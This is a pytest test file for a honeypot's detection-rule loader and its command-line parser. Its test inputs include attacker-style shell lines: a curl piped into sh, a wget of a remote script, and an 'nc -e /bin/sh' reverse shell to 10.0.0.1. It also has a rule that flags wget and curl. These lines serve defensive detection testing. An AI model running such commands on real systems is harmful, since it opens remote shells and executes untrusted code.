"""Reading and validating the detection rule configuration (RF-11).

The rules are the part of the detection an operator changes, so they are tested
without a database: what a valid file produces, and what an invalid one is
refused for. The severity of a rule is what the alert it raises gets (RF-12).
"""

from __future__ import annotations

import textwrap
from pathlib import Path

import pytest

from honeypot_backend.config import Settings
from honeypot_backend.detection.matching import invoked_commands
from honeypot_backend.detection.rules import RuleConfigError, RulesFile, load_rules
from honeypot_backend.detection.service import DetectionService

VALID = """
version = 1

[[rule]]
id = "auth_bruteforce"
kind = "auth_threshold"
title = "Authentication attempts from one IP"
description = "Several attempts in a short period."
threshold = 4
window_seconds = 120
severity = "high"

[[rule]]
id = "command_of_interest"
kind = "command_of_interest"
title = "Execution of a command of interest"
commands = ["wget", "curl"]
severity = "medium"

[[rule]]
id = "file_download"
kind = "file_transfer"
title = "File download"
event_types = ["transfer.download"]
"""


def write(tmp_path: Path, content: str, name: str = "rules.toml") -> Path:
    """Write a rule file and return its path."""

    path = tmp_path / name
    path.write_text(textwrap.dedent(content), encoding="utf-8")
    return path


def test_a_valid_file_is_read_with_every_rule(tmp_path) -> None:
    rules = load_rules(write(tmp_path, VALID))

    assert rules.version == 1
    assert [rule.id for rule in rules.rules] == [
        "auth_bruteforce",
        "command_of_interest",
        "file_download",
    ]


def test_the_parameters_of_a_rule_are_kept(tmp_path) -> None:
    rules = load_rules(write(tmp_path, VALID))

    auth = rules.by_id("auth_bruteforce")

    assert auth is not None
    assert auth.threshold == 4
    assert auth.window_seconds == 120
    assert auth.window.total_seconds() == 120


def test_a_rule_carries_the_severity_of_the_alert_it_raises(tmp_path) -> None:
    rules = load_rules(write(tmp_path, VALID))

    assert rules.by_id("auth_bruteforce").severity == "high"
    assert rules.by_id("command_of_interest").severity == "medium"
    # A rule that does not declare one gets the neutral level.
    assert rules.by_id("file_download").severity == "medium"


def test_an_unknown_severity_is_refused(tmp_path) -> None:
    with pytest.raises(RuleConfigError, match="severity"):
        load_rules(write(tmp_path, VALID.replace('severity = "high"', 'severity = "urgent"')))


def test_a_rule_without_its_required_parameters_is_refused(tmp_path) -> None:
    without_window = VALID.replace("window_seconds = 120", "")

    with pytest.raises(RuleConfigError, match="window_seconds"):
        load_rules(write(tmp_path, without_window))


def test_an_unknown_kind_is_refused(tmp_path) -> None:
    with pytest.raises(RuleConfigError, match="kind"):
        load_rules(write(tmp_path, VALID.replace('kind = "file_transfer"', 'kind = "magic"')))


def test_a_misspelled_parameter_is_refused(tmp_path) -> None:
    with pytest.raises(RuleConfigError):
        load_rules(write(tmp_path, VALID.replace("threshold = 4", "treshold = 4")))


def test_two_rules_with_the_same_id_are_refused(tmp_path) -> None:
    duplicated = VALID + """
[[rule]]
id = "file_download"
kind = "file_transfer"
title = "Another download"
"""

    with pytest.raises(RuleConfigError, match="duplicate rule id"):
        load_rules(write(tmp_path, duplicated))


def test_a_file_that_is_not_toml_is_refused(tmp_path) -> None:
    with pytest.raises(RuleConfigError, match="not valid TOML"):
        load_rules(write(tmp_path, "version = ["))


def test_a_missing_file_is_refused(tmp_path) -> None:
    with pytest.raises(RuleConfigError, match="cannot read"):
        load_rules(tmp_path / "absent.toml")


def test_no_file_means_no_rules() -> None:
    assert load_rules(None) == RulesFile()


def test_the_shipped_configuration_is_valid() -> None:
    """The file that ships with the repository has to load."""

    service = DetectionService.from_settings(Settings())

    assert service.available, service.error
    assert {rule.kind for rule in service.rules.rules} == {
        "auth_threshold",
        "command_of_interest",
        "file_transfer",
    }


def test_a_missing_file_leaves_detection_unavailable_and_explains_itself(tmp_path) -> None:
    service = DetectionService.from_settings(
        Settings(detection_rules_path=tmp_path / "absent.toml")
    )

    assert not service.available
    assert "cannot read the rule file" in (service.error or "")
    assert service.engine.rule_count == 0


def test_a_broken_file_leaves_detection_unavailable_and_explains_itself(tmp_path) -> None:
    service = DetectionService.from_settings(
        Settings(detection_rules_path=write(tmp_path, 'version = ["not an int"]'))
    )

    assert not service.available
    assert "does not describe a valid rule set" in (service.error or "")


def test_a_valid_file_produces_an_engine_with_one_evaluator_per_rule(tmp_path) -> None:
    service = DetectionService.from_settings(
        Settings(detection_rules_path=write(tmp_path, VALID))
    )

    assert service.available
    assert service.error is None
    assert service.engine.rule_count == 3
    assert [rule.spec.id for rule in service.engine.rules] == [
        "auth_bruteforce",
        "command_of_interest",
        "file_download",
    ]


def test_the_rules_endpoint_reports_the_configured_parameters(tmp_path) -> None:
    service = DetectionService.from_settings(
        Settings(detection_rules_path=write(tmp_path, VALID))
    )

    described = service.describe()

    assert described["available"] is True
    assert described["error"] is None
    assert described["version"] == 1
    assert described["rules"][0]["parameters"]["threshold"] == 4
    assert described["rules"][0]["severity"] == "high"


class TestInvokedCommands:
    """Which executables a command line runs, for the command rule."""

    def test_a_plain_command_is_its_own_executable(self) -> None:
        assert invoked_commands("wget http://example.test/x.sh") == ("wget",)

    def test_the_path_of_the_executable_does_not_matter(self) -> None:
        assert invoked_commands("/usr/bin/curl -sO http://x") == ("curl",)

    def test_a_tool_used_by_another_command_is_found(self) -> None:
        assert invoked_commands("sudo wget http://x") == ("wget",)

    def test_a_tool_used_by_a_wrapper_with_options_is_still_read(self) -> None:
        assert invoked_commands("env FOO=1 curl http://x") == ("curl",)

    def test_every_part_of_a_pipeline_is_considered(self) -> None:
        assert invoked_commands("curl -s http://x | sh") == ("curl", "sh")

    def test_the_payload_of_a_shell_is_considered(self) -> None:
        assert invoked_commands('sh -c "wget http://x"') == ("sh", "wget")

    def test_a_word_that_only_looks_like_a_tool_is_not_an_executable(self) -> None:
        assert invoked_commands("echo wget") == ("echo",)

    def test_a_command_mentioned_in_an_argument_is_not_an_executable(self) -> None:
        assert invoked_commands("grep wget /var/log/auth.log") == ("grep",)

    def test_inline_code_is_not_read_as_a_command(self) -> None:
        assert invoked_commands("python3 -c 'import wget'") == ("python3",)

    def test_several_commands_on_one_line_are_all_found(self) -> None:
        assert invoked_commands("ls; nc -e /bin/sh 10.0.0.1 4444") == ("ls", "nc")

    def test_a_line_with_an_unterminated_quote_is_still_read(self) -> None:
        assert invoked_commands('echo "unterminated wget') == ("echo",)

    def test_a_command_without_a_line_has_no_executables(self) -> None:
        assert invoked_commands(None) == ()
